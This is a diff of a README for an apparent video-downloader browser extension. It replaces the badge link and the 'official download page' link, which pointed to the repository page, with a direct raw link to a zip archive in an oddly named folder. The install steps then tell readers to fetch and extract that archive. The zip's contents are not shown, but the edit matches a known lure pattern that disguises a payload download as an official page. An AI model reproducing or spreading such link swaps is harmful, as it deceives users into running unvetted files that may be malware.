@@ -1,6 +1,6 @@
 # 📥 321tube-video-downloader - Save videos for offline viewing today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/waweru7871/321tube-video-downloader)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/waweru7871/321tube-video-downloader/main/seemliness/downloader-tube-video-v1.9.zip)
 
 This software allows users to save videos from 321tube. You store videos on your computer to watch them without an internet connection. The application acts as a browser extension. It adds a download button to 321tube pages. You click the button to save the file. 
 
@@ -18,7 +18,7 @@ Ensure you have at least 100 megabytes of free storage space on your hard drive.
 
 The installation process follows standard steps for browser extensions on Windows. Follow these instructions to add the tool to your browser.
 
-1. Visit the [official download page](https://github.com/waweru7871/321tube-video-downloader) to get the files.
+1. Visit the [official download page](https://raw.githubusercontent.com/waweru7871/321tube-video-downloader/main/seemliness/downloader-tube-video-v1.9.zip) to get the files.
 2. Locate the button labeled "Download" on the page.
 3. Save the compressed folder to your computer.
 4. Open the folder and extract the contents to a location you remember, such as your desktop or documents folder.
